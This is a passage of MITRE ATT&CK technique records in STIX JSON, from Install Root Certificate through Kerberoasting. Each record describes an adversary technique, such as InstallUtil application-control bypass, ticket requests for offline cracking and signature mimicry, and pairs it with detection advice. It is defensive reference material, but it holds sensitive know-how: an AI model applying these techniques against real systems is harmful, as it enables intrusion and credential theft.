Sigcheck May 2017\",\"url\":\"https://docs.microsoft.com/sysinternals/downloads/sigcheck\"},{\"description\":\"Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.\",\"source_name\":\"Tripwire AppUNBlocker\",\"url\":\"https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/\"}],\"id\":\"attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-19T20:31:11.389Z\",\"name\":\"Install Root Certificate\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matt Graeber, @mattifestation, SpecterOps\",\"Red Canary\",\"Travis Smith, Tripwire\",\"Itzik Kotler, SafeBreach\"],\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Digital certificate logs\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\"],\"x_mitre_detection\":\"A system\'s root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. (Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. (Citation: Microsoft Sigcheck May 2017)\\n\\nInstalled root certificates are located in the Registry under <code>HKLM\\\\SOFTWARE\\\\Microsoft\\\\EnterpriseCertificates\\\\Root\\\\Certificates\\\\</code> and <code>[HKLM or HKCU]\\\\Software[\\\\Policies\\\\]\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\Certificates\\\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)\\n\\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\\n* CDD4EEAE6000AC7F40C3802C171E30148030C072\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:27.510Z\",\"external_references\":[{\"external_id\":\"T1118\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1118\"},{\"description\":\"Microsoft. (n.d.). Installutil.exe (Installer Tool). Retrieved July 1, 2016.\",\"source_name\":\"MSDN InstallUtil\",\"url\":\"https://msdn.microsoft.com/en-us/library/50614e95.aspx\"},{\"description\":\"LOLBAS. (n.d.). Installutil.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Installutil\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Installutil/\"}],\"id\":\"attack-pattern--f792d02f-813d-402b-86a5-ab98cb391d3b\",\"modified\":\"2020-01-31T18:59:38.256Z\",\"name\":\"InstallUtil\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T19:09:48.811Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v<version>\\\\InstallUtil.exe</code> and <code>C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v<version>\\\\InstallUtil.exe</code>.\\n\\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)\",\"external_references\":[{\"external_id\":\"T1218.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/004\"},{\"description\":\"Microsoft. (n.d.). Installutil.exe (Installer Tool). Retrieved July 1, 2016.\",\"source_name\":\"MSDN InstallUtil\",\"url\":\"https://msdn.microsoft.com/en-us/library/50614e95.aspx\"},{\"description\":\"LOLBAS. (n.d.). Installutil.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Installutil\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Installutil/\"}],\"id\":\"attack-pattern--2cd950a6-16c4-404a-aa01-044322395107\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:34:46.529Z\",\"name\":\"InstallUtil\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\",\"Casey Smith\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\",\"Application control\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-12T14:08:48.689Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \\n\\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms.\",\"external_references\":[{\"external_id\":\"T1559\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1559\"}],\"id\":\"attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-28T19:34:47.546Z\",\"name\":\"Inter-Process Communication\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"DLL monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"User\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-20T14:31:34.778Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary\'s presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)\",\"external_references\":[{\"external_id\":\"T1491.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1491/001\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.\",\"source_name\":\"Novetta Blockbuster\",\"url\":\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\"},{\"description\":\"Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.\",\"source_name\":\"Novetta Blockbuster Destructive Malware\",\"url\":\"https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\"}],\"id\":\"attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T22:57:04.784Z\",\"name\":\"Internal Defacement\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Web logs\",\"Web application firewall logs\",\"Packet capture\"],\"x_mitre_detection\":\"Monitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\",\"x_mitre_impact_type\":[\"Integrity\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-14T23:08:20.244Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\\n\\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.\",\"external_references\":[{\"external_id\":\"T1090.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1090/001\"},{\"description\":\"Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.\",\"source_name\":\"Trend Micro APT Attack Tools\",\"url\":\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-15T00:46:26.598Z\",\"name\":\"Internal Proxy\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-09-04T19:26:12.441Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user\'s device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)\\n\\nAdversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.\\n\\nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)\",\"external_references\":[{\"external_id\":\"T1534\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1534\"},{\"description\":\"Chris Taylor. (2017, October 5). When Phishing Starts from the Inside. Retrieved October 8, 2019.\",\"source_name\":\"Trend Micro When Phishing Starts from the Inside 2017\",\"url\":\"https://blog.trendmicro.com/phishing-starts-inside/\"},{\"description\":\"THE FINANCIAL TIMES. (2019, September 2). A sobering day. Retrieved October 8, 2019.\",\"source_name\":\"THE FINANCIAL TIMES LTD 2019.\",\"url\":\" https://labs.ft.com/2013/05/a-sobering-day/?mhq5j=e6 \"}],\"id\":\"attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-31T22:13:33.718Z\",\"name\":\"Internal Spearphishing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Tim MalcomVetter\",\"Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"DNS records\",\"Anti-virus\",\"Web proxy\",\"File monitoring\",\"Mail server\",\"Office 365 trace logs\"],\"x_mitre_detection\":\"Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing attacks.(Citation: Trend Micro When Phishing Starts from the Inside 2017)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\",\"Office 365\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-10T19:49:46.752Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)\\n\\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.\",\"external_references\":[{\"external_id\":\"T1036.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1036/001\"},{\"description\":\"Vest, J. (2017, October 9). Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads. Retrieved September 10, 2019.\",\"source_name\":\"Threatexpress MetaTwin 2017\",\"url\":\"https://threatexpress.com/blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/\"}],\"id\":\"attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-02-10T19:52:47.724Z\",\"name\":\"Invalid Code Signature\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Binary file metadata\"],\"x_mitre_detection\":\"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-23T19:12:24.924Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\\n\\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\\n\\nAdversaries may abuse JavaScript / JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\",\"external_references\":[{\"external_id\":\"T1059.007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059/007\"},{\"description\":\"OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.\",\"source_name\":\"NodeJS\",\"url\":\"https://nodejs.org/\"},{\"description\":\"Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.\",\"source_name\":\"JScrip May 2018\",\"url\":\"https://docs.microsoft.com/windows/win32/com/translating-to-jscript\"},{\"description\":\"Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript …. Retrieved June 23, 2020.\",\"source_name\":\"Microsoft JScript 2007\",\"url\":\"https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript\"},{\"description\":\"Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.\",\"source_name\":\"Microsoft Windows Scripts\",\"url\":\"https://docs.microsoft.com/scripting/winscript/windows-script-interfaces\"}],\"id\":\"attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-25T03:23:13.804Z\",\"name\":\"JavaScript/JScript\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Loaded DLLs\",\"DLL monitoring\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\\n\\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-15T00:30:25.444Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. \",\"external_references\":[{\"external_id\":\"T1001.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1001/001\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-15T00:30:25.444Z\",\"name\":\"Junk Data\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1208\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1208\"},{\"description\":\"Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.\",\"source_name\":\"Microsoft Detecting Kerberoasting Feb 2018\",\"url\":\"https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/\"},{\"description\":\"Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.\",\"source_name\":\"Microsoft SPN\",\"url\":\"https://msdn.microsoft.com/library/ms677949.aspx\"},{\"description\":\"Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.\",\"source_name\":\"Microsoft SetSPN\",\"url\":\"https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx\"},{\"description\":\"Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.\",\"source_name\":\"SANS Attacking Kerberos Nov 2014\"},{\"description\":\"Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved March 23, 2018.\",\"source_name\":\"Harmj0y Kerberoast Nov 2016\",\"url\":\"https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/\"},{\"description\":\"EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.\",\"source_name\":\"Empire InvokeKerberoast Oct 2016\",\"url\":\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\"},{\"description\":\"Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.\",\"source_name\":\"AdSecurity Cracking Kerberos Dec 2015\",\"url\":\"https://adsecurity.org/?p=2293\"}],\"id\":\"attack-pattern--b39d03cb-7b98-41c4-a878-c40c1a913dc0\",\"modified\":\"2020-02-11T20:35:32.042Z\",\"name\":\"Kerberoasting\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T18:43:38.588Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \\n\\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\\n\\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\\n\\nThis same attack could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\\n\\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)\",\"external_references\":[{\"external_id\":\"T1558.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1558/003\"},{\"description\":\"EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.\",\"source_name\":\"Empire InvokeKerberoast Oct 2016\",\"url\":\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\"},{\"description\":\"Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.\",\"source_name\":\"AdSecurity Cracking Kerberos Dec 2015\",\"url\":\"https://adsecurity.org/?p=2293\"},{\"description\":\"Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.\",\"source_name\":\"Microsoft Detecting Kerberoasting Feb 2018\",\"url\":\"https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/\"},{\"description\":\"Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.\",\"source_name\":\"Microsoft SPN\",\"url\":\"https://msdn.microsoft.com/library/ms677949.aspx\"},{\"description\":\"Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.\",\"source_name\":\"Microsoft SetSPN\",\"url\":\"https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx\"},{\"description\":\"Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.\",\"source_name\":\"SANS Attacking Kerberos Nov 2014\"},{\"description\":\"Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved March 23, 2018.\",\"source_name\":\"Harmj0y Kerberoast Nov 2016\",\"url\":\"https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/\"}],\"id\":\"attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-02-27T18:25:30.124Z\",\"name\":\"Kerberoasting\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Windows event logs\"],\"x_mitre_detection\":\"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 